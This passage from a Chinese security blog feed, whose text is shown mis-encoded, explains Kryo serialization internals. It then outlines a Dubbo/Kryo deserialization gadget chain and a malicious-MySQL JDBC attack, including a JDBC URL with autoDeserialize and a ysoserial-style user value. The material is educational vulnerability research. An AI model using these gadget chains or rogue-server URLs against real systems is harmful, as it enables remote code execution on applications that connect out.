class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å¾…åºåˆ—åŒ–ç›®æ ‡ç±»MyClassï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>    <span class="hljs-keyword">public</span> String hello;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> num;<br>   <span class="hljs-comment">// çœç•¥getterã€setterã€toString</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.esotericsoftware.kryo.Kryo;<br><span class="hljs-keyword">import</span> com.esotericsoftware.kryo.io.Input;<br><span class="hljs-keyword">import</span> com.esotericsoftware.kryo.io.Output;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Kryo</span> <span class="hljs-variable">kryo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Kryo</span>();<br>        kryo.register(MyClass.class);<br>        <span class="hljs-type">MyClass</span> <span class="hljs-variable">myClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br>        myClass.setHello(<span class="hljs-string">&quot;Hello Kryo&quot;</span>);<br>        myClass.setNum(<span class="hljs-number">11</span>);<br><br>        <span class="hljs-type">Output</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Output</span>(Files.newOutputStream(Paths.get(<span class="hljs-string">&quot;file.bin&quot;</span>)));<br>        kryo.writeObject(output, myClass);<br>        output.close();<br><br>        <span class="hljs-type">Input</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Input</span>(Files.newInputStream(Paths.get(<span class="hljs-string">&quot;file.bin&quot;</span>)));<br>        <span class="hljs-type">MyClass</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> kryo.readObject(input, MyClass.class);<br>        input.close();<br>        System.out.println(obj);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// MyClass&#123;hello=&#x27;Hello Kryo&#x27;, num=11&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Ser-Deser"><a href="#Ser-Deser" class="headerlink" title="Ser &amp; Deser"></a>Ser &amp; Deser</h2><p><code>Kryo</code>æä¾›äº†ä¸‰ç»„æ–¹æ³•æ¥è¯»å†™å¯¹è±¡</p><blockquote><ul><li>ç±»æœªçŸ¥ä¸”å¯¹è±¡å¯èƒ½ä¸ºnull</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">kryo.writeClassAndObject(output, object);<br><span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> kryo.readClassAndObject(input);<br></code></pre></td></tr></table></figure><ul><li>ç±»å·²çŸ¥ä¸”å¯¹è±¡å¯èƒ½ä¸ºnull</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">kryo.writeObjectOrNull(output, object);<br><span class="hljs-type">SomeClass</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> kryo.readObjectOrNull(input, SomeClass.class);<br></code></pre></td></tr></table></figure><ul><li>ç±»å·²çŸ¥ä¸”å¯¹è±¡ä¸ä¸ºnull</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">kryo.writeObject(output, object);<br><span class="hljs-type">SomeClass</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> kryo.readObject(input, SomeClass.class);<br></code></pre></td></tr></table></figure></blockquote><p>è¿™äº›æ–¹æ³•é¦–å…ˆéƒ½æ˜¯æ‰¾åˆ°åˆé€‚çš„åºåˆ—åŒ–å™¨ï¼ˆserializerï¼‰ï¼Œå†è¿›è¡Œåºåˆ—åŒ–æˆ–ååºåˆ—åŒ–ï¼Œåºåˆ—åŒ–å™¨ä¼šé€’å½’åœ°è°ƒç”¨è¿™äº›æ–¹æ³•ã€‚</p><h3 id="Kryoçš„æ³¨å†Œ"><a href="#Kryoçš„æ³¨å†Œ" class="headerlink" title="Kryoçš„æ³¨å†Œ"></a>Kryoçš„æ³¨å†Œ</h3><p>Kryoä¸ºäº†æä¾›æ€§èƒ½å’Œå‡å°åºåˆ—åŒ–ç»“æœä½“ç§¯ï¼Œæä¾›æ³¨å†Œåºåˆ—åŒ–å¯¹è±¡ç±»çš„æ–¹å¼ã€‚</p><p>åœ¨æ³¨å†Œæ—¶ï¼Œä¼šä¸ºè¯¥åºåˆ—åŒ–ç±»ç”Ÿæˆint ID, åç»­åœ¨åºåˆ—åŒ–æ—¶ä½¿ç”¨int IDå”¯ä¸€æ ‡è¯†è¯¥ç±»å‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">kryo.register(SomeClass.class);<br></code></pre></td></tr></table></figure><h3 id="åºåˆ—åŒ–æµç¨‹"><a href="#åºåˆ—åŒ–æµç¨‹" class="headerlink" title="åºåˆ—åŒ–æµç¨‹"></a>åºåˆ—åŒ–æµç¨‹</h3><p>è·Ÿè¿›<code>writeClassAndObject</code>ï¼š</p><p><img src="/2024/08/14/Kyro/image-20240814215655799.png" alt="image-20240814215655799"></p><h4 id="Registrationè·å–"><a href="#Registrationè·å–" class="headerlink" title="Registrationè·å–"></a>Registrationè·å–</h4><p><code>writeClass(output, object.getClass())</code>è¿”å›ä¸€ä¸ª<code>object</code>ç±»çš„<code>Registration</code></p><p>è‹¥è¯¥ç±»æ²¡æœ‰æ³¨å†Œè¿‡ï¼ˆä¹Ÿå°±æ˜¯æ²¡æœ‰ä¸Šé¢çš„<code>kryo.register</code>æŒ‡å®šä¸€ä¸ªç±»ï¼‰ï¼Œä¼šè‡ªåŠ¨ä½¿ç”¨é»˜è®¤çš„åºåˆ—åŒ–å™¨æ³¨å†Œï¼Œæ³¨å†Œæœ‰ä¸¤ä¸ªç›®çš„ï¼šè·å–åºåˆ—åŒ–å™¨å’Œç±»çš„å”¯ä¸€æ ‡è¯†Idï¼Œæ–¹ä¾¿åç»­çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">get:<span class="hljs-number">351</span>, ObjectMap (com.esotericsoftware.kryo.util)<br>getRegistration:<span class="hljs-number">79</span>, DefaultClassResolver (com.esotericsoftware.kryo.util)<br>getRegistration:<span class="hljs-number">488</span>, Kryo (com.esotericsoftware.kryo)<br>writeClass:<span class="hljs-number">97</span>, DefaultClassResolver (com.esotericsoftware.kryo.util)<br>writeClass:<span class="hljs-number">540</span>, Kryo (com.esotericsoftware.kryo)<br>writeClassAndObject:<span class="hljs-number">645</span>, Kryo (com.esotericsoftware.kryo)<br>main:<span class="hljs-number">16</span>, Test<br></code></pre></td></tr></table></figure><p><code>com.esotericsoftware.kryo.util.ObjectMap</code>ç±»ç»´æŠ¤äº†ä¸€ä¸ª<code>Class</code>ä¸<code>Registration</code>ï¼ˆå«ç›¸å¯¹åº”çš„ååºåˆ—åŒ–å™¨ï¼‰çš„å¯¹åº”è¡¨ï¼š</p><p><img src="/2024/08/14/Kyro/image-20240814215910090.png" alt="image-20240814215910090"></p><p>å½“ç„¶æˆ‘ä»¬è‡ªå®šä¹‰çš„ç±»è‚¯å®šåœ¨è¿™ä¸ªè¡¨ä¸­æ‰¾ä¸åˆ°ï¼Œé‡Œé¢éƒ½æ˜¯Javaçš„åŸºç¡€ç±»ï¼Œ<code>DefaultClassResolver#getRegistration</code>å°±è¿”å›nullã€‚</p><p>æ¥ç€è¿›å…¥<code>registerImplicit</code> -&gt; <code>getDefaultSerializer</code>ç»§ç»­æ‰¾ä¸€äº›Javaå†…ç½®ç±»æ˜¯å¦å’Œå¾…åºåˆ—åŒ–ç±»å¯¹åº”</p><p><img src="/2024/08/14/Kyro/image-20240814215948131.png" alt="image-20240814215948131"></p><p>ç»§ç»­è·Ÿè¿›ï¼Œå‘ç°<code>FieldSerializer</code>ä½œä¸ºé»˜è®¤åºåˆ—åŒ–å™¨ï¼Œå¹¶åœ¨<code>FieldSerializer#rebuildCachedFields</code>ä¸­è·å–åºåˆ—åŒ–ç±»çš„<code>Fields</code>ï¼Œå¿½ç•¥é™æ€æˆå‘˜ã€‚</p><p><img src="/2024/08/14/Kyro/image-20240814220004870.png" alt="image-20240814220004870"></p><p>åˆ°æ­¤å°±è·å–åˆ°äº†è‡ªå®šä¹‰ç±»çš„<code>Registration</code>ã€‚</p><h4 id="Fieldåºåˆ—åŒ–"><a href="#Fieldåºåˆ—åŒ–" class="headerlink" title="Fieldåºåˆ—åŒ–"></a>Fieldåºåˆ—åŒ–</h4><p>æ¥ç€è¿›å…¥<code>FieldSerializer.write(this, output, object);</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">CachedField[] fields = <span class="hljs-built_in">this</span>.fields;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>, n = fields.length; i &lt; n; i++)<br>    fields[i].write(output, object);<br></code></pre></td></tr></table></figure><p><code>Kryo</code>å°è£…äº†ä¸€ä¸ª<code>UnsafeUtil</code>ï¼ˆ<code>Unsafe</code>å¯¹è±¡é€šè¿‡åå°„è·å–ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> sun.misc.Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>field.setAccessible(<span class="hljs-literal">true</span>);<br>_unsafe = (sun.misc.Unsafe)field.get(<span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p>åœ¨JVMä¸­ï¼Œå¯¹å®ä¾‹çš„Fieldè¿›è¡Œäº†æœ‰è§„å¾‹çš„å­˜å‚¨ï¼Œé€šè¿‡ä¸€ä¸ªåç§»é‡å¯ä»¥ä»å†…å­˜ä¸­æ‰¾åˆ°ç›¸åº”çš„Fieldå€¼</p><p>unsafeå®ç°äº†åœ¨å†…å­˜å±‚é¢ï¼Œé€šè¿‡æˆå‘˜å­—æ®µåç§»é‡offsetæ¥è·å–å¯¹è±¡çš„å±æ€§å€¼</p><p>æ¥ç€è·å–æˆå‘˜çš„åºåˆ—åŒ–å™¨ï¼Œæ­¥éª¤è·Ÿä¸Šé¢çš„ä¸€æ ·ï¼ˆ<code>getRegistration(type).getSerializer()</code>ï¼‰</p><p><img src="/2024/08/14/Kyro/image-20240814220143706.png" alt="image-20240814220143706"></p><p>å‰©ä¸‹çš„å°±æ˜¯ç»§ç»­é€’å½’æ‰€æœ‰æˆå‘˜ï¼Œè·å–åºåˆ—åŒ–å™¨è¿›è¡Œåºåˆ—åŒ–ã€‚</p><h3 id="ååºåˆ—åŒ–æµç¨‹"><a href="#ååºåˆ—åŒ–æµç¨‹" class="headerlink" title="ååºåˆ—åŒ–æµç¨‹"></a>ååºåˆ—åŒ–æµç¨‹</h3><p>åŒæ ·ä¹Ÿæ˜¯å…ˆè·å–ç±»çš„<code>Registration</code>ï¼Œå†ä»<code>Registration</code>æ‹¿åºåˆ—åŒ–å™¨ã€‚</p><p><img src="/2024/08/14/Kyro/image-20240814220215114.png" alt="image-20240814220215114"></p><p><code>FieldSerializer#read</code>é¦–å…ˆå¯¹ç±»è¿›è¡Œå®ä¾‹åŒ–ï¼Œè¿™é‡Œæ˜¯ä½¿ç”¨äº†Kryoå°è£…çš„<code>com.esotericsoftware.reflectasm#ConstructorAccess</code>å»æ„é€ ç±»å¯¹è±¡ï¼ŒåŸºäºASMï¼Œè¿˜æ²¡å­¦è¿‡ASMï¼Œå°±ä¸æ·±å…¥è·Ÿè¿›å»çœ‹äº†ã€‚</p><p><img src="/2024/08/14/Kyro/image-20240814220231804.png" alt="image-20240814220231804"></p><p>åŒæ ·æ˜¯è·å–æˆå‘˜çš„åºåˆ—åŒ–å™¨ï¼Œé€’å½’è°ƒç”¨<code>readObject</code>ï¼š</p><p><img src="/2024/08/14/Kyro/image-20240814220247330.png" alt="image-20240814220247330"></p><p>å¯ä»¥è·Ÿä¸€ä¸‹è¿™é‡Œçš„<code>readObjectOrNull</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">object = (T)serializer.read(<span class="hljs-built_in">this</span>, input, type);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„åºåˆ—åŒ–å™¨æ˜¯<code>StringSerializer</code>ï¼Œç›´æ¥ä»è¾“å…¥æµinputè¯»å–äº†ï¼Œå¦åˆ™å°±ç»§ç»­è°ƒç”¨ä¸Šé¢çš„<code>FieldSerializer#read</code>äº†</p><p>åé¢çš„<code>setField</code>ä¹Ÿæ˜¯ç”¨<code>unsafe</code>ä»å†…å­˜å±‚é¢å¾€æˆå‘˜åç§»é‡å¤„å¡«å……å€¼</p><p><img src="/2024/08/14/Kyro/image-20240814220307247.png" alt="image-20240814220307247"></p><p>ååºåˆ—åŒ–ç»“æŸã€‚</p><p>å¯æ€»ç»“ä¸ºï¼š</p><p><img src="/2024/08/14/Kyro/image-20240814220339130.png" alt="image-20240814220339130"></p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>ç½‘ä¸Šæ‰¾åˆ°çš„Kryoååºåˆ—åŒ–é—®é¢˜éƒ½æ˜¯åœ¨Dubboé‚£å—çš„ã€‚</p><p>Dubboé»˜è®¤çš„åºåˆ—åŒ–åè®®æ˜¯Hessianï¼Œä½†å¯ä»¥ä¿®æ”¹Dubboåè®®æ•°æ®åŒ…ä¸­çš„headerï¼ŒæŒ‡å®šSerializationIDï¼Œæ¥ç¡®å®šConsumerå’ŒProvideré€šä¿¡ä½¿ç”¨çš„åºåˆ—åŒ–åè®®ï¼Œè¿™é‡Œå°±ä¸ç»†è®²Dubboæ•°æ®åŒ…çš„ä¿®æ”¹äº†ï¼Œè€Œæ˜¯æŠ½å–å…¶ä¸­å…³é”®çš„Kryoååºåˆ—åŒ–ï¼ŒDubboç›¸å…³çš„å…·ä½“å¯ä»¥çœ‹<a href="https://p4d0rn.gitbook.io/java/serial-journey/dubbo">å¤§ä½¬å†™çš„</a>ã€‚</p><p><strong>è°ƒç”¨æ ˆ</strong></p><blockquote><p>getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</p><p>newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</p><p>getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</p><p>write:-1, ASMSerializer_1_TemplatesImpl (com.alibaba.fastjson.serializer)</p><p>write:270, MapSerializer (com.alibaba.fastjson.serializer)</p><p>write:44, MapSerializer (com.alibaba.fastjson.serializer)</p><p>write:280, JSONSerializer (com.alibaba.fastjson.serializer)</p><p>toJSONString:863, JSON (com.alibaba.fastjson)</p><p>toString:857, JSON (com.alibaba.fastjson)</p><p>equals:392, XString (com.sun.org.apache.xpath.internal.objects)</p><p>equals:104, HotSwappableTargetSource (org.springframework.aop.target)</p><p>putVal:635, HashMap (java.util)</p><p>put:612, HashMap (java.util)</p><p>read:162, MapSerializer (com.esotericsoftware.kryo.serializers)</p><p>read:39, MapSerializer (com.esotericsoftware.kryo.serializers)</p><p>readClassAndObject:813, Kryo (com.esotericsoftware.kryo)</p></blockquote><p>Kryoä»inputä¸­è¯»å–è§£æåˆ°typeä¸ºHashMap</p><p>å› æ­¤ä¼šè°ƒç”¨<code>MapSerializer</code>åºåˆ—åŒ–å™¨æ¥è¯»å–inputä¸­çš„ä¿¡æ¯</p><p>æ—¢ç„¶æ˜¯Mapçš„ååºåˆ—åŒ–å°±è‚¯å®šæ¶‰åŠåˆ°é”®å€¼å¯¹çš„å¤„ç†</p><p><code>MapSerializer</code>ä¼šå°†è§£æåˆ°çš„keyå’Œvalueéƒ½é€šè¿‡è°ƒç”¨<code>map.put()</code>æ¥æ”¾å…¥HashMapå¯¹è±¡ä¸­</p><p>æ¥ç€è°ƒç”¨<code>putVal()</code>ï¼Œ<code>equals()</code>åˆ¤æ–­ä¸¤ä¸ªé”®æ˜¯å¦ç›¸å¯¹</p><p><code>com.sun.org.apache.xpath.internal.objects.XString#equals</code>ä¼šè°ƒç”¨<code>toString</code></p><p><img src="/2024/08/14/Kyro/image-20240814220600476.png" alt="image-20240814220600476"></p><p><code>org.springframework.aop.target.HotSwappableTargetSource#equals</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object other)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span> == other || other <span class="hljs-keyword">instanceof</span> HotSwappableTargetSource &amp;&amp; <span class="hljs-built_in">this</span>.target.equals(((HotSwappableTargetSource)other).target);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤šå¥—ä¸€ä¸ª<code>HotSwappableTargetSource</code>æ˜¯ä¸ºäº†è®©HashMapçš„<code>putVal</code>èƒ½èµ°åˆ°<code>equals</code></p><p>è¿™é‡Œè§¦å‘<code>com.alibaba.fastjson.JSON</code>ç±»çš„<code>toString()</code>å‡½æ•°ï¼Œè¿›è€Œè°ƒç”¨<code>JSONSerializer</code>çš„<code>write()</code>å‡½æ•°ï¼Œä»è€Œè§¦å‘Fastjson Gadgetã€‚</p><p>å‚è€ƒï¼š</p><ul><li><a href="https://www.mi1k7ea.com/2021/06/30/%E6%B5%85%E6%9E%90Dubbo-KryoFST%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-25641%EF%BC%89/">æµ…æDubbo Kryo&#x2F;FSTååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2021-25641ï¼‰Mi1k7ea</a></li><li><a href="https://p4d0rn.gitbook.io/java/serial-journey/kryo#kryo-de-zhu-ce">Kryo | Java (gitbook.io)</a></li><li><a href="https://www.cnblogs.com/bitterz/p/15588955.html">Dubboçš„ååºåˆ—åŒ–å®‰å…¨é—®é¢˜â€”â€”kryoå’Œfst - bitterz - åšå®¢å›­ (cnblogs.com)</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JDBC</title>
    <link href="/2024/08/13/JDBC/"/>
    <url>/2024/08/13/JDBC/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>JDBCï¼ˆJava DataBase Connectivityï¼‰æ˜¯SUNå…¬å¸å‘å¸ƒçš„ä¸€ä¸ªjavaç¨‹åºä¸æ•°æ®åº“ä¹‹é—´é€šä¿¡çš„æ¥å£ï¼ˆè§„èŒƒï¼‰ï¼Œå„å¤§æ•°æ®åº“å‚å•†å»å®ç°JDBCè§„èŒƒï¼Œå¹¶å°†å®ç°ç±»æ‰“åŒ…æˆjaråŒ…ã€‚</p><p><img src="/2024/08/13/JDBC/image-20240813152834923.png" alt="image-20240813152834923"></p><p>ç”±äºJDKç‰ˆæœ¬çš„æå‡ä»¥åŠä¾èµ–åŒ…çš„æ›´æ–°ï¼Œå„ç§æ¶æ„ç±»æ–¹é¢çš„ååºåˆ—åŒ–éƒ½æˆ–å¤šæˆ–å°‘æ”¶åˆ°å½±å“ï¼Œèƒ½æ‰“çš„é“¾å­ä¹Ÿä¼šè¶Šæ¥è¶Šå°‘ï¼Œä½†æ˜¯JDBCæŠŠæ•°æ®åº“æœºåˆ¶å¼•å…¥ï¼Œä½¿å¾—åœ¨å½“å‰å¤§ç¯å¢ƒä¸‹Javaæ¼æ´ä¸ä»…ä»…å±€é™åœ¨javaæ–¹é¢ï¼Œä¹Ÿå¯ä»¥é…åˆæ•°æ®åº“æ–¹é¢è¿›è¡Œattackï¼Œè¿™ç§æ–¹å¼ä»æ—§ç»ä¹…ä¸è¡°ï¼Œè¶³è§JDBCæ”»å‡»çš„é€‚åº”æ€§ä¹‹å¼ºã€‚</p><p>æ‰€ä»¥Hessianæˆ‘è¿˜æ˜¯æ”¾åˆ°åé¢å†è¯´ï¼Œè¿™é‡Œå…ˆæŠŠJDBCæµ…æµ…å¼•å…¥ä¸€ä¸‹ã€‚</p><h2 id="MySQL-JDBC"><a href="#MySQL-JDBC" class="headerlink" title="MySQL-JDBC"></a>MySQL-JDBC</h2><h3 id="ååºåˆ—åŒ–åˆ†æ"><a href="#ååºåˆ—åŒ–åˆ†æ" class="headerlink" title="ååºåˆ—åŒ–åˆ†æ"></a>ååºåˆ—åŒ–åˆ†æ</h3><p>è¿›è¡Œæ•°æ®åº“è¿æ¥æ—¶æŒ‡å®šäº†æ•°æ®åº“çš„URLåŠè¿æ¥é…ç½®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Connection</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/test&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>);<br></code></pre></td></tr></table></figure><p>è‹¥JDBCè¿æ¥çš„URLè¢«æ”»å‡»è€…æ§åˆ¶ï¼Œå°±å¯ä»¥è®©å…¶æŒ‡å‘æ¶æ„çš„MySQLæœåŠ¡å™¨</p><p>JDBCè¿æ¥MySQLæœåŠ¡ç«¯æ—¶ï¼Œä¼šæœ‰å‡ ä¸ªå†…ç½®çš„SQLæŸ¥è¯¢è¯­å¥ä¼šæ‰§è¡Œï¼ŒæŸ¥è¯¢çš„ç»“æœé›†ä¼šåœ¨MySQLå®¢æˆ·ç«¯è¢«å¤„ç†æ—¶ä¼šè°ƒç”¨<code>ObjectInputStream#readObject</code>è¿›è¡Œååºåˆ—åŒ–ã€‚</p><p>æ”»å‡»è€…å¯ä»¥æ­å»ºæ¶æ„MySQLæœåŠ¡å™¨ï¼Œè¿”å›ç²¾å¿ƒæ„é€ çš„æŸ¥è¯¢ç»“æœé›†ï¼Œè¿›è¡Œå®¢æˆ·ç«¯ååºåˆ—åŒ–æ”»å‡»ã€‚</p><p>å¯è¢«åˆ©ç”¨çš„ä¸¤æ¡æŸ¥è¯¢è¯­å¥ï¼š</p><ul><li>SHOW SESSION STATUS</li><li>SHOW COLLATION</li></ul><p>æ¶æ„MySQLæœåŠ¡å™¨æ­å»ºï¼š</p><ul><li><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a> ğŸ“Œ</li><li><a href="https://github.com/rmb122/rogue_mysql_server">https://github.com/rmb122/rogue_mysql_server</a></li></ul><p>ä¸Šè¿°å·¥å…·æ˜¯æ¨¡æ‹ŸMySQLå‘åŒ…è¿‡ç¨‹ç”¨çš„ï¼Œåªéœ€è¦å¼€å¯¹åº”ç«¯å£è¿è¡Œè„šæœ¬å°±å¯ä»¥äº†ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.sql.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jdbc_url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/test?&quot;</span> +<br>            <span class="hljs-string">&quot;autoDeserialize=true&quot;</span> + <span class="hljs-string">&quot;&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections7_calc&quot;</span>;<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> DriverManager.getConnection(jdbc_url, <span class="hljs-string">&quot;yso_CommonsCollections7_calc&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">DriverManager#getConnection<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">connectOneTryOnly=&gt;<span class="hljs-built_in">this</span>.session.setQueryInterceptors(<span class="hljs-built_in">this</span>.queryInterceptors);<br></code></pre></td></tr></table></figure><p>è®¾ç½®å¯¹åº”çš„æŸ¥è¯¢æ‹¦æˆªå™¨ï¼ˆå³æˆ‘ä»¬æŒ‡å®šçš„<code>ServerStatusDiffInterceptor</code>ï¼‰</p><p>æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ä¼šè°ƒç”¨æ‹¦æˆªå™¨çš„<code>preProcess</code>å’Œ<code>postProcess</code></p><p>åˆ¤æ–­æ‹¦æˆªå™¨æ˜¯å¦ä¸ºç©ºï¼Œéç©ºåˆ™è°ƒç”¨<code>invokeQueryInterceptorsPre</code></p><p><img src="/2024/08/13/JDBC/image-20240813174856268.png" alt="image-20240813174856268"></p><p><code>invokeQueryInterceptorsPre</code>è°ƒç”¨äº†æ‹¦æˆªå™¨çš„<code>preProcess</code>ï¼š</p><p><img src="/2024/08/13/JDBC/image-20240813174917368.png" 